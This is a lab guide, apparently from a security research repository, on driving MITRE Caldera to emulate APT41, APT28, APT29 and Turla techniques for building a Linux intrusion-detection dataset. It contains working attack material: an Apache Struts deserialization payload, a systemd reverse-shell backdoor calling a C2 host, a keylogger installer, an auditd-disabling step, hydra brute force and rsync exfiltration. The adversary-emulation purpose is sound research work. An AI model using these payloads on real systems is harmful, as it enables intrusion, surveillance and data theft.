# Caldera Usage Guide — Simulating MITRE ATT&CK Tactics & Techniques

**Reference paper:** Karim, S.S., Afzal, M., Iqbal, W., Al Abri, D. (2024). *Advanced Persistent Threat (APT) and intrusion detection evaluation dataset for Linux systems 2024*. Data in Brief 54, 110290. (Linux-APT-Dataset-2024)

**Caldera docs:** <https://caldera.readthedocs.io/en/latest/>

This guide explains how to reproduce, in MITRE Caldera, the same MITRE ATT&CK tactics and techniques that the paper used to generate Linux-APT-Dataset-2024. It is organized around the paper's Tables 4 and 5 (tactic / technique counts) and the four APT groups the authors emulated (APT41, APT28, APT29, Turla) plus the additional Apache Struts / keylogger / backdoor scenarios.

For lab-specific Caldera operations (REST API recipes, STRIX pipeline correlation, troubleshooting against this repo's Docker victims), see the existing [CALDERA_PLAYBOOK.md](CALDERA_PLAYBOOK.md). This guide focuses on the *what to simulate* and *which Caldera abilities/adversaries map to which technique*; the playbook covers the *how to drive it from this lab*.

---

## 1. Background — what the paper simulated

The paper builds a Linux-centric APT/intrusion dataset by:

- Running attacks from a Kali-style attacker host against three Ubuntu 22.04 victims, two on `192.168.158.0/24`, one on `192.168.217.0/24`.
- Forwarding host events to a centralized **Wazuh 4.5.2** SIEM and **Kaspersky Security Center 14.2** AV.
- Using **open-source Caldera** plus YARA rules to drive the attacker emulation.
- Mapping every captured event to MITRE ATT&CK *tactic* and *technique* IDs.

The resulting dataset contains **125,898 records** (101,046 benign + 24,852 malicious/suspicious) collected between **01-Oct-2023 and 07-Jan-2024**, spanning the tactic and technique counts shown below.

### 1.1 Tactics (paper Table 4)

| Tactic | Records |
|---|---|
| Defense Evasion | 18,124 |
| Privilege Escalation | 17,164 |
| Initial Access | 16,624 |
| Discovery | 14,058 |
| Impact | 2,868 |
| Persistence | 1,709 |
| Execution | 1,655 |
| Reconnaissance | 643 |
| Lateral Movement | 240 |
| Credential Access | 35 |
| Collection | 3 |
| Command and Control | 2 |

### 1.2 Top techniques (paper Table 5, abridged)

| Technique | MITRE ID | Records |
|---|---|---|
| Exploit Public-Facing Application | T1190 | 14,919 |
| File and Directory Discovery | T1083 | 13,999 |
| Valid Accounts | T1078 | 6,820 |
| Sudo and Sudo Caching | T1548.003 | 2,382 |
| Stored Data Manipulation | T1565.001 | 1,625 |
| JavaScript | T1059.007 | 1,487 |
| File Deletion | T1070.004 | 1,251 |
| Data Destruction | T1485 | 1,243 |
| Vulnerability Scanning | T1595.002 | 643 |
| Exploitation for Privilege Escalation | T1068 | 340 |
| Remote Services | T1021 | 213 |
| Command and Scripting Interpreter | T1059 | 164 |
| File Deletion / Indicator Removal | T1070 | 8 |
| SSH | T1021.004 | 21 |
| Network Sniffing | T1040 | 12 |
| Password Guessing | T1110.001 | 29 |
| Process Discovery | T1057 | 41 |
| Disable or Modify Tools | T1562.001 | 27 |
| Linux/Mac File and Directory Permissions Modification | T1222.002 | 9 |
| Timestomp | T1070.006 | 1 |
| ... | ... | ... |

---

## 2. Caldera setup recap

The four moving parts you need:

1. **Caldera server** (`http://localhost:8888` in this lab; `red`/`admin`).
2. **Sandcat agent** running on each Linux victim, enrolled into a group (the lab uses `red`).
3. **Stockpile plugin** — ships ~600 default abilities and ~30 adversary profiles, indexed by MITRE technique. This is the catalog you draw from.
4. **Atomic plugin** *(optional)* — wraps Red Canary's Atomic Red Team tests as Caldera abilities. Enable it if you need techniques the stockpile lacks (most notably initial-access exploits and several persistence variants).

If you are running this repo's Docker lab, [LAB_BRINGUP.md](LAB_BRINGUP.md) wires all of this up. If you are running upstream Caldera standalone:

```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python server.py --insecure --build
# Enable atomic plugin in conf/local.yml:  plugins: [atomic, stockpile, sandcat, manx, response, training]
```

Verify the agent is enrolled:

```bash
curl -s http://localhost:8888/api/v2/agents -H "KEY: ADMIN123" | \
  jq '.[] | {paw, host, platform, group}'
```

---

## 3. Core concepts cheat sheet

| Term | Role | Where to find it |
|---|---|---|
| **Ability** | One MITRE technique implementation (a bash/PowerShell/Python snippet). Tagged with `technique_id` and `tactic`. | UI: *Campaigns → Abilities*. API: `GET /api/v2/abilities`. YAML: `plugins/stockpile/data/abilities/<tactic>/*.yml`. |
| **Adversary** | An ordered list of abilities — i.e. an attack profile. | UI: *Campaigns → Adversaries*. API: `GET /api/v2/adversaries`. |
| **Planner** | Decides ability execution order: `batch` (sequential), `atomic` (one at a time), `buckets` (cycle by tactic), `look ahead`, `bayes`. | API: `GET /api/v2/planners`. Use `batch` unless you need otherwise. |
| **Operation** | Adversary + Group + Planner + Obfuscator. The actual run. | UI: *Campaigns → Operations*. |
| **Group** | Tag on agents for targeting. Lab agents enroll as `red`. | Agents UI. |
| **Obfuscator** | Command-line transform: `plain-text`, `base64`, `base64jumble`, `caesar cipher`. Drives how noisy the command field looks to Wazuh. | Per-operation setting. |
| **Fact** | Key/value learned during an op (host name, user, file path…). Re-used by later abilities via `#{property}` placeholders. | UI: *Advanced → Facts*. |

The dataset categorization in the paper (general vs. malicious/suspicious) is rule-based on Wazuh — Caldera produces the malicious half; the benign half comes from baseline user/system activity. The simulation guide below targets only the malicious half.

---

## 4. The general workflow for any technique

For every technique in §5 the workflow is the same. Use this as a template, then refer to §5 for the technique-specific values.

1. **Find the ability** for the technique:

   ```bash
   CALDERA=http://localhost:8888
   KEY="KEY: ADMIN123"
   TECH=T1083                # the MITRE technique you want

   curl -s "$CALDERA/api/v2/abilities" -H "$KEY" | \
     jq -r '.[] | select(.technique_id=="'"$TECH"'") |
            "\(.ability_id)  [\(.platforms|join(","))]  \(.name)"'
   ```

2. **Either** use a stockpile adversary that already chains it (§6 below), **or** build a one-off adversary:

   ```bash
   ABILITY=<paste an ability_id from step 1>

   ADV_ID=$(curl -s -X POST "$CALDERA/api/v2/adversaries" -H "$KEY" \
     -H "Content-Type: application/json" -d "{
       \"name\": \"sim-${TECH}-$(date +%s)\",
       \"atomic_ordering\": [\"$ABILITY\"]
     }" | jq -r '.adversary_id')
   ```

3. **Pick a planner** (live, since IDs change per Caldera version):

   ```bash
   PLANNER=$(curl -s "$CALDERA/api/v2/planners" -H "$KEY" | \
     jq -r '.[] | select(.name=="batch") | .id')
   ```

4. **Launch the operation**:

   ```bash
   curl -s -X POST "$CALDERA/api/v2/operations" -H "$KEY" \
     -H "Content-Type: application/json" -d "{
       \"name\": \"sim-${TECH}-$(date +%s)\",
       \"adversary\": { \"adversary_id\": \"$ADV_ID\" },
       \"group\": \"red\",
       \"planner\": { \"id\": \"$PLANNER\" },
       \"obfuscator\": \"plain-text\",
       \"autonomous\": 1,
       \"state\": \"running\"
     }" | jq '{id, state}'
   ```

5. **Watch & report** — see [CALDERA_PLAYBOOK.md §4.4](CALDERA_PLAYBOOK.md).

> **Tip — picking the obfuscator.** The paper does not say which obfuscation level was used during data collection. To reproduce both the "clean" rows and the evasive rows, run each technique twice: once with `plain-text` and once with `base64` (or `base64jumble`). The latter is what populates engineered features like `cmd_base64=1`.

---

## 5. Per-tactic simulation recipes

Each section below covers: what the tactic is, which **paper-listed techniques** fall under it, and the **stockpile abilities** (and where applicable atomic-plugin abilities) that drive each.

> The `ability_id` values in stockpile change between Caldera releases. Always look up via `GET /api/v2/abilities` (§4 step 1) — names are stable, IDs are not.

### 5.1 Reconnaissance — TA0043

**Paper techniques:** Vulnerability Scanning (T1595.002, 643 records).

**What to run.** Caldera does not ship a network port-scanner ability by default; the closest stockpile match is *"Scan IP for ports"* under `discovery/`. For broader recon (ASN lookup, web fingerprinting), use the **atomic** plugin (`atomic-red-team` T1595 tests) or call `nmap` from a manual ad-hoc ability.

| Technique | MITRE | Stockpile ability (name) | Notes |
|---|---|---|---|
| Vulnerability Scanning | T1595.002 | "Scan IP for ports" | Wrap in a one-off adversary; pass `target.ip` as a fact |

**Recipe.**

```bash
# Drop a fact source with the target subnet first.
curl -s -X POST "$CALDERA/api/v2/fact_sources" -H "$KEY" \
  -H "Content-Type: application/json" -d '{
    "name": "lab-targets",
    "facts": [{"trait":"target.ip","value":"192.168.158.0/24"}]
  }'
```

Then run the discovery adversary in §5.4 with this fact source attached.

### 5.2 Initial Access — TA0001

**Paper techniques:** Exploit Public-Facing Application (T1190, 14,919 records — the single biggest contributor in the dataset), Valid Accounts (T1078, 6,820), Apache Struts vulnerability (a special case of T1190).

**What to run.** This is where Caldera *out of the box* is weakest — the stockpile is mostly post-compromise. The Caldera docs themselves treat initial access as a separate category requiring custom scripts (see *Initial Access Attacks* in the readthedocs). Three options:

1. **Caldera "Initial Access" plugin** *(if installed)* — provides ability scaffolding for SSH spray, phishing payload delivery, and exploit launchers. Enable in `conf/local.yml`.
2. **Atomic plugin** — `T1190` and `T1078.003` have Atomic Red Team tests. Enable atomic and search by technique ID.
3. **Manual seeding** — drop the agent on the victim out-of-band (the paper effectively did this since they were generating *training* data, not testing exploit reliability) and start the operation from a "post-exploitation" baseline. This is the recommended path for dataset generation.

| Technique | MITRE | How to simulate |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Atomic test `T1190`; or run a vulnerable container (e.g. `vulhub/struts2-s2-052`) and exploit manually with `curl`. |
| Apache Struts (S2-045/052) | T1190 | Run `metasploit struts2_content_type_ognl` against a `vulhub` instance; capture the resulting `/var/log/auth.log` + audit events. |
| Valid Accounts | T1078 | Use stockpile *"SSH login with password"* (under `lateral-movement/`); pre-seed user creds via fact source. |
| Password Guessing | T1110.001 | Wrap `hydra` in a manual ability (Caldera doesn't ship one). Drives Wazuh rules `5710`–`5720`. |

**Recipe — Apache Struts (manual, captured by Wazuh):**

```bash
# In the lab: spin up a vulnerable Struts target.
docker run -d --name struts_victim --network strix_lab_net \
  -p 8088:8080 vulhub/struts2:s2-052

# From the attacker host, fire the OGNL injection.
curl -s -X POST "http://struts_victim:8080/orders/3" \
  -H 'Content-Type: application/xml' \
  --data-binary @- <<'XML' | head -c 500
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher"><serviceIterator class="javax.imageio.spi.FilterIterator">
              <iter class="javax.imageio.spi.FilterIterator$EmptyIterator"/>
              <filter class="javax.imageio.ImageIO$ContainsFilter">
                <method><class>java.lang.Runtime</class><name>exec</name>
                  <parameter-types><class>java.lang.String</class></parameter-types></method>
                <name>id</name></filter><next class="string">foo</next>
            </serviceIterator></cipher><input class="java.lang.ProcessBuilder">
              <command><string>id</string></command><redirectErrorStream>false</redirectErrorStream>
          </input></is></dataSource></dataHandler></value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
XML
```

Ethical note: only run this against the in-lab `vulhub` container, never against external services.

### 5.3 Execution — TA0002

**Paper techniques:** Command and Scripting Interpreter (T1059, 164), JavaScript (T1059.007, 1,487), Unix Shell (T1059.004, 3), Native API (T1106, 1).

**What to run.** This is the bread and butter of Caldera. Practically every stockpile ability either is, or shells out to, an interpreter. So you do not need to run T1059 standalone — it gets covered by every other operation. To produce dedicated execution-only records, use these:

| Technique | MITRE | Stockpile ability |
|---|---|---|
| Unix Shell | T1059.004 | "Find files" / any bash-based ability — the parent abilities of most stockpile ops |
| JavaScript | T1059.007 | Stockpile has a few Node.js-driven abilities under `execution/`; otherwise use atomic `T1059.007` |
| Command and Scripting Interpreter | T1059 | "Compile and run" abilities under `execution/` |

To bias counts toward this tactic: run the **Discovery** adversary (§5.4) with `obfuscator=base64jumble` — every ability becomes a `bash -c '<base64-decoded>'` chain, which reflects in `data.command`.

### 5.4 Persistence — TA0003

**Paper techniques:** Account Manipulation (T1098, 1), Create Account (T1136, 3), Valid Accounts (T1078) overlap.

**What to run.**

| Technique | MITRE | Stockpile ability |
|---|---|---|
| Create Account | T1136 | "Create local user" (under `persistence/`) |
| Account Manipulation | T1098 | "Add user to admin group", "SSH key persistence" |
| Boot or Logon Init Scripts | T1037 | "Add cron job for persistence" — heavy auditd `path=/etc/cron.d/*` signal |
| Server Software Component (web shell) | T1505.003 | atomic `T1505.003`, not in stockpile |

**Quick chain — minimal persistence adversary:**

```bash
# Look up the abilities you want to chain
for n in "Create local user" "Add user to admin group" "Add cron job for persistence"; do
  curl -s "$CALDERA/api/v2/abilities" -H "$KEY" | \
    jq -r --arg n "$n" '.[] | select(.name==$n) | .ability_id'
done
# -> $A1, $A2, $A3

curl -s -X POST "$CALDERA/api/v2/adversaries" -H "$KEY" \
  -H "Content-Type: application/json" -d "{
    \"name\":\"sim-persistence\",
    \"atomic_ordering\":[\"$A1\",\"$A2\",\"$A3\"]
  }"
```

### 5.5 Privilege Escalation — TA0004

**Paper techniques:** Sudo and Sudo Caching (T1548.003, 2,382), Exploitation for Privilege Escalation (T1068, 340), Linux/Mac File and Directory Permissions Modification (T1222.002, 9).

**What to run.**

| Technique | MITRE | Stockpile ability |
|---|---|---|
| Sudo and Sudo Caching | T1548.003 | "Check sudoers" / "Run as sudo" — usually folded into Discovery pack |
| Exploitation for Privilege Escalation | T1068 | atomic `T1068` (kernel exploit launchers); stockpile has limited coverage |
| File/Directory Permissions Modification | T1222.002 | "chmod a binary" / "Add SUID bit" abilities under `privilege-escalation/` |

**Pattern:** for sudo-caching specifically, run a chain that does `sudo -n <something>` *twice* a minute apart — the second one shows in audit logs as a `cached` sudo grant, which is what trips Wazuh rule `5404`.

```bash
# Ad-hoc abilities (as YAML, copy into plugins/stockpile/data/abilities/privilege-escalation/sim_sudo_cache.yml)
- id: 9d1e1c20-1111-2222-3333-444455556666
  name: "Sudo cached escalation"
  description: "Run sudo twice to populate the sudo timestamp cache (T1548.003)"
  tactic: privilege-escalation
  technique:
    attack_id: T1548.003
    name: Sudo and Sudo Caching
  platforms:
    linux:
      sh:
        command: |
          sudo -n id || true
          sleep 65
          sudo -n id || true
```

### 5.6 Defense Evasion — TA0005

**Paper techniques (largest tactic in the dataset):** File Deletion (T1070.004, 1,251), Indicator Removal from Tools (T1070, 8), Disable or Modify Tools (T1562.001, 27), Match Legitimate Name or Location (T1036.005, 4), Timestomp (T1070.006, 1).

**What to run.**

| Technique | MITRE | Stockpile ability |
|---|---|---|
| File Deletion | T1070.004 | "Clear bash history", "Delete staged files" — used as cleanup steps in Thief |
| Disable or Modify Tools | T1562.001 | "Disable auditd" (manual ability — Caldera doesn't ship one targeting auditd specifically; see snippet below) |
| Match Legitimate Name or Location | T1036.005 | "Rename binary as system tool" — typically `cp /tmp/payload /usr/local/sbin/sshd-update` |
| Timestomp | T1070.006 | "Touch -d to alter mtime" — rarely in stockpile, easier as ad-hoc |

**Custom ability — disable auditd (drop into `plugins/stockpile/data/abilities/defense-evasion/`):**

```yaml
- id: c1aa11b2-2222-3333-4444-555566667777
  name: "Disable auditd"
  description: "Stop the auditd daemon to suppress execve auditing (T1562.001)"
  tactic: defense-evasion
  technique:
    attack_id: T1562.001
    name: Disable or Modify Tools
  platforms:
    linux:
      sh:
        command: "service auditd stop || systemctl stop auditd"
        cleanup: "service auditd start || systemctl start auditd"
```

> Always include `cleanup` for evasion abilities — Caldera runs them at operation end and you do *not* want to leave the SIEM blind.

### 5.7 Credential Access — TA0006

**Paper techniques:** Password Guessing (T1110.001, 29).

**What to run.**

| Technique | MITRE | Approach |
|---|---|---|
| Password Guessing | T1110.001 | Custom ability wrapping `hydra -L users.txt -P pass.txt ssh://target` |
| OS Credential Dumping (`/etc/shadow`) | T1003.008 | atomic `T1003.008`, or stockpile "Cat shadow file" |
| Brute Force: SSH | T1110.001 | Same as Password Guessing — separate ability for clarity |

**Custom hydra ability:**

```yaml
- id: f88c6633-aaaa-bbbb-cccc-ddddeeee0001
  name: "SSH password guessing (hydra)"
  description: "Brute-force SSH login (T1110.001)"
  tactic: credential-access
  technique:
    attack_id: T1110.001
    name: Password Guessing
  platforms:
    linux:
      sh:
        command: |
          hydra -t 4 -L /tmp/users.txt -P /tmp/passwords.txt \
            ssh://#{target.host}:22 -o /tmp/hydra.out 2>&1 | tail -n 5
        payload:
          - users.txt
          - passwords.txt
```

### 5.8 Discovery — TA0007

**Paper techniques (3rd-largest tactic):** File and Directory Discovery (T1083, 13,999), Process Discovery (T1057, 41), System Information Discovery (T1082, 7), System Network Connections Discovery (T1049, 1), System Owner/User Discovery (T1033, 1), Network Sniffing (T1040, 12).

**What to run.** The stockpile **Discovery** adversary already exercises most of these. For exhaustive coverage, build a single adversary that chains every discovery ability:

```bash
DISC_IDS=$(curl -s "$CALDERA/api/v2/abilities" -H "$KEY" | \
  jq -r '[.[] | select(.tactic=="discovery") | .ability_id]')

curl -s -X POST "$CALDERA/api/v2/adversaries" -H "$KEY" \
  -H "Content-Type: application/json" -d "{
    \"name\":\"sim-discovery-full\",
    \"atomic_ordering\":$DISC_IDS
  }"
```

| Technique | MITRE | Stockpile ability |
|---|---|---|
| File and Directory Discovery | T1083 | "Find files", "List directory contents" |
| Process Discovery | T1057 | "View Processes" (`ps -ef`) |
| System Information Discovery | T1082 | "Identify system" (`uname -a`, `/etc/os-release`) |
| System Network Connections Discovery | T1049 | "Network connections" (`ss -tunap`, `netstat`) |
| System Owner/User Discovery | T1033 | "View user" (`whoami`, `id`) |
| Network Sniffing | T1040 | "tcpdump packet capture" — usually as a custom ability since tcpdump needs root |

### 5.9 Lateral Movement — TA0008

**Paper techniques:** Remote Services (T1021, 213), SSH (T1021.004, 21), Exploitation of Remote Services (T1210, 6).

**What to run.**

| Technique | MITRE | Stockpile ability |
|---|---|---|
| SSH | T1021.004 | "SSH login with password", "SSH key copy" |
| Remote Services (general) | T1021 | Same — facets of SSH |
| Exploitation of Remote Services | T1210 | atomic `T1210`; manual Metasploit |

**Practical setup.** The lab's two-victim segment (`192.168.158.0/24`) is built specifically for this — with both victims agented as `red`, you can pivot from `victim1` to `victim2`:

```yaml
# plugins/stockpile/data/abilities/lateral-movement/sim_ssh_lateral.yml
- id: aabbccdd-1111-2222-3333-444455556666
  name: "Lateral SSH login"
  description: "Authenticate to a peer host (T1021.004)"
  tactic: lateral-movement
  technique:
    attack_id: T1021.004
    name: SSH
  platforms:
    linux:
      sh:
        command: |
          sshpass -p '#{lateral.password}' ssh -o StrictHostKeyChecking=no \
            #{lateral.user}@#{lateral.host} 'id; hostname; uptime'
```

Drop a fact source with `lateral.user`, `lateral.password`, `lateral.host` populated for the second victim.

### 5.10 Collection — TA0009

**Paper techniques:** Data from Local System (T1005, 3).

**What to run.** The stockpile **Collection** adversary handles this — it stages findings into `/tmp/staged/`. For a single-technique simulation:

| Technique | MITRE | Stockpile ability |
|---|---|---|
| Data from Local System | T1005 | "Stage sensitive files" / "Find sensitive files" |
| Archive Collected Data | T1560.001 | "Compress staged directory" (tar+gzip) |

The paper records only 3 collection events, suggesting authors did not exercise this tactic heavily — you can match that ratio by running Collection only once or twice across the whole campaign.

### 5.11 Command and Control — TA0011

**Paper techniques:** Ingress Tool Transfer (T1105, 2). The dataset has only 2 C2 records, so this is intentionally light.

**What to run.**

| Technique | MITRE | Stockpile ability |
|---|---|---|
| Ingress Tool Transfer | T1105 | "Download Sandcat agent" — this is what every Caldera op already does. To produce a dedicated record, use "wget a payload" |
| Application Layer Protocol — DNS | T1071.004 | Caldera supports a DNS contact for sandcat (`--connection dns`) — switch the agent to it briefly. |

The Caldera docs section *C2 Communications Tunneling* covers SSH tunneling between agent and server — useful if you want to recreate the "private-to-public network flow" path the paper captured (Fig. 1).

### 5.12 Impact — TA0040

**Paper techniques:** Data Destruction (T1485, 1,243), Stored Data Manipulation (T1565.001, 1,625).

**What to run.** Be careful — these techniques delete or corrupt data on the victim. Run **only** against the disposable lab containers, never on a host with real data.

| Technique | MITRE | Stockpile ability |
|---|---|---|
| Data Destruction | T1485 | "Destroy files" (`rm -rf` on a staged path); "shred" |
| Stored Data Manipulation | T1565.001 | Custom ability — the stockpile doesn't ship one specifically. See snippet below. |

**Custom — stored data manipulation:**

```yaml
- id: 99887766-aaaa-bbbb-cccc-1234567890ab
  name: "Tamper application config"
  description: "Modify stored application config to alter behavior (T1565.001)"
  tactic: impact
  technique:
    attack_id: T1565.001
    name: Stored Data Manipulation
  platforms:
    linux:
      sh:
        command: |
          sed -i 's/^auth_required.*/auth_required false/' /etc/myapp/config.yml || true
          ls -la /etc/myapp/
        cleanup: "echo 'cleanup not supplied — restore from backup'"
```

---

## 6. APT-group emulation (paper Table 2)

The four APT groups in the paper map to Caldera adversaries / atomic profiles as follows. Caldera does not ship named "APT41 / APT28 / APT29 / Turla" adversaries by default — Atomic Red Team's `Indexes/CTI-Index.md` provides per-group indices that you can convert into adversary YAMLs. Below is the recommended chain for each.

### 6.1 APT41

Paper note: *"commonly used as backdoor/rootkit and for exfiltration commonly uses Rsync and Exfil."*

**Recommended chain (in order):**

| Step | Tactic | Technique | Caldera ability (name) |
|---|---|---|---|
| 1 | Initial Access | T1190 | Apache Struts manual exploit (§5.2) |
| 2 | Execution | T1059.004 | "Run shell command" |
| 3 | Persistence | T1136.001 | "Create local user" |
| 4 | Privilege Escalation | T1068 | atomic `T1068` |
| 5 | Defense Evasion | T1070.004 | "Clear bash history" |
| 6 | Discovery | T1083 | "Find files" |
| 7 | Collection | T1005 | "Stage sensitive files" |
| 8 | C2 | T1105 | "wget a payload" |
| 9 | Exfiltration | T1048 | Custom rsync ability (below) |

**Custom rsync exfil ability (the APT41 signature):**

```yaml
- id: a41a41a4-1a41-2a41-3a41-4a41a41a41a4
  name: "Exfil via rsync"
  description: "APT41-style exfil over rsync (T1048)"
  tactic: exfiltration
  technique:
    attack_id: T1048
    name: Exfiltration Over Alternative Protocol
  platforms:
    linux:
      sh:
        command: |
          rsync -avz /tmp/staged/ #{exfil.user}@#{exfil.host}:/incoming/ 2>&1 | tail
```

### 6.2 APT28 (Sofacy)

Paper note: *"searches and actively exploits known vulnerabilities, then tries to establish remote access, perform file manipulations, and data exfiltration."*

**Recommended chain:**

| Step | Tactic | Technique | Ability |
|---|---|---|---|
| 1 | Reconnaissance | T1595.002 | "Scan IP for ports" |
| 2 | Initial Access | T1190 | Manual exploit of a known CVE |
| 3 | Execution | T1059 | "Run shell command" |
| 4 | Discovery | T1083, T1057, T1082 | Discovery pack |
| 5 | Privilege Escalation | T1068 | atomic `T1068` |
| 6 | Defense Evasion | T1070.004, T1036.005 | "Clear bash history", "Rename binary" |
| 7 | Collection | T1005 | "Stage sensitive files" |
| 8 | Exfiltration | T1041 | "Curl POST staged file" |

### 6.3 APT29

Paper note: *"stealthy adversary group uses various initial access methods usually via phishing and exploiting known issues, then utilizes different undetected malwares and custom tools for performing specific tasks like lateral movement, privilege escalation."*

**Recommended chain (heavy on stealth = obfuscator `base64jumble`):**

| Step | Tactic | Technique | Ability |
|---|---|---|---|
| 1 | Initial Access | T1566 | Phishing — manual (drop a tar via email simulation) |
| 2 | Execution | T1059.004 | "Run shell command" with `base64` obfuscator |
| 3 | Persistence | T1098, T1136 | "Add user to admin group", "Create local user" |
| 4 | Defense Evasion | T1562.001, T1070 | "Disable auditd", "Indicator removal" |
| 5 | Lateral Movement | T1021.004 | "Lateral SSH login" |
| 6 | Privilege Escalation | T1548.003 | "Sudo cached escalation" |
| 7 | Discovery | T1083, T1033 | Discovery pack subset |
| 8 | C2 | T1071.004 | Switch sandcat to DNS contact |

### 6.4 Turla

Paper note: *"Also known as Snake and Uroburos has suspected origin of Russian government. It has diverse options for persistence via backdoor. It searches for the credentials and other sensitive information."*

**Recommended chain (heavy persistence + credential focus):**

| Step | Tactic | Technique | Ability |
|---|---|---|---|
| 1 | Initial Access | T1078 | "SSH login with valid creds" |
| 2 | Persistence | T1037, T1136 | "Add cron job for persistence", "Create local user" |
| 3 | Privilege Escalation | T1548.003 | "Sudo cached escalation" |
| 4 | Credential Access | T1003.008, T1110.001 | "Cat shadow file", "SSH password guessing" |
| 5 | Discovery | T1057, T1082 | "View Processes", "Identify system" |
| 6 | Collection | T1005 | "Stage sensitive files" |
| 7 | Defense Evasion | T1070.006 | "Timestomp" custom ability |

---

## 7. Special-case scenarios from the paper

### 7.1 Apache Struts (CVE-2017-9805 / CVE-2017-5638)

Already covered in §5.2. Use vulhub for the target. Wazuh detects this via rules `31108` / `31151` (Apache access log + suspicious POST body).

### 7.2 Keylogger

Caldera doesn't ship a Linux keylogger ability. To reproduce the paper's keylogger records, drop a ready-made tool (e.g. `lkl` or `logkeys`) via an Ingress Tool Transfer ability and exec it. Wazuh picks up on the `/dev/input/eventX` open via auditd if you have a `-w /dev/input -p rwxa` audit rule.

```yaml
- id: kkkk1111-2222-3333-4444-555566667777
  name: "Install logkeys keylogger"
  description: "Drop and start a keylogger (T1056.001)"
  tactic: collection
  technique:
    attack_id: T1056.001
    name: Keylogging
  platforms:
    linux:
      sh:
        command: |
          apt-get install -y logkeys 2>/dev/null || true
          logkeys --start --output /tmp/.lk.log &
          echo "keylogger pid=$!"
        cleanup: "pkill -f logkeys; rm -f /tmp/.lk.log"
```

### 7.3 Backdoor malware

The simplest reproducible backdoor for dataset purposes is a reverse-shell systemd service.

```yaml
- id: bdbd1111-2222-3333-4444-555566667777
  name: "Install reverse-shell backdoor"
  description: "Persist a reverse shell as a systemd service (T1543.002)"
  tactic: persistence
  technique:
    attack_id: T1543.002
    name: Systemd Service
  platforms:
    linux:
      sh:
        command: |
          cat >/etc/systemd/system/sysmgr.service <<EOF
          [Unit]
          Description=System Manager
          [Service]
          ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/#{c2.host}/#{c2.port} 0>&1'
          Restart=always
          [Install]
          WantedBy=multi-user.target
          EOF
          systemctl daemon-reload
          systemctl enable --now sysmgr.service
        cleanup: "systemctl disable --now sysmgr.service; rm -f /etc/systemd/system/sysmgr.service"
```

---

## 8. Verification — confirming Wazuh captured the simulation

This is what closes the loop with the paper's methodology. After every operation:

1. **Caldera says it ran:**

   ```bash
   curl -s "$CALDERA/api/v2/operations/$OP_ID" -H "$KEY" | \
     jq '.chain[] | {ability:.ability.name, status, finish}'
   ```

   `status: 0` = succeeded. Anything else = ability didn't run, no Wazuh alert is coming.

2. **Wazuh has new alerts:**

   ```bash
   # On the Wazuh manager (or via Indexer API)
   curl -sk -u admin:'admin-pass' \
     "https://localhost:9200/wazuh-alerts-*/_search?size=5&sort=timestamp:desc" \
     | jq '.hits.hits[]._source | {timestamp, "rule.id":.rule.id, "rule.description":.rule.description, "agent.name":.agent.name}'
   ```

3. **MITRE technique IDs are tagged on the alert** (this is how the paper built Tables 4 & 5):

   ```bash
   curl -sk -u admin:'admin-pass' \
     "https://localhost:9200/wazuh-alerts-*/_search?q=rule.mitre.id:T1083&size=3" \
     | jq '.hits.hits[]._source.rule.mitre'
   ```

   If `rule.mitre.id` is empty for an alert that *should* have a tactic mapping, edit `local_rules.xml` — the paper's `local_rules.xml` (517 lines, distributed alongside the dataset) is a reference for what coverage looks like.

---

## 9. Reproducing the paper's full distribution

To roughly match the paper's tactic distribution (Table 4), weight your Caldera operations approximately like this:

| Tactic | Ops to run / weight | Notes |
|---|---|---|
| Defense Evasion | 7× per APT chain | Embed at least one evasion step in every adversary |
| Privilege Escalation | 7× per APT chain | Sudo + T1068 every chain |
| Initial Access | 7× per APT chain | Re-trigger Struts / valid-account login per chain |
| Discovery | 6× per APT chain | Discovery pack runs every campaign |
| Impact | 1× per APT chain | Data destruction toward the end |
| Persistence | 1× per APT chain | One persistence step per chain |
| Execution | 1× per APT chain | Folded into other steps |
| Reconnaissance | 1× per APT chain | Port scan at start |
| Lateral Movement | once every 3 chains | T1021.004 across the two-victim segment |
| Credential Access | rare (1 in 5 chains) | Hydra + shadow file |
| Collection | rare | One Collection adversary per campaign |
| Command and Control | rare | Most ops already implicitly C2 — count is low because Wazuh rules tag few of them as such |

Run the four APT chains (§6) **3–4 times each** over a multi-day window — that produces the long-tail timestamps the paper captured (01-Oct-2023 → 07-Jan-2024) and reproduces the rough 80/20 benign/malicious ratio when intermixed with normal user activity.

---

## 10. Further reading

- **Caldera official docs** — <https://caldera.readthedocs.io/en/latest/>
- **Stockpile abilities catalog** — `plugins/stockpile/data/abilities/` (per-tactic YAMLs)
- **Atomic Red Team CTI index** — <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/CTI-Index.md>
- **Lab playbook in this repo** — [CALDERA_PLAYBOOK.md](CALDERA_PLAYBOOK.md)
- **Wazuh rule → technique mapping in this repo** — [WAZUH_MAPPING.md](WAZUH_MAPPING.md)
- **Linux-APT-Dataset-2024 (Mendeley)** — <https://data.mendeley.com/datasets/5x68fv63sh/2>
- **Linux-APT-Dataset-2024 (Zenodo)** — <https://zenodo.org/records/10685642>
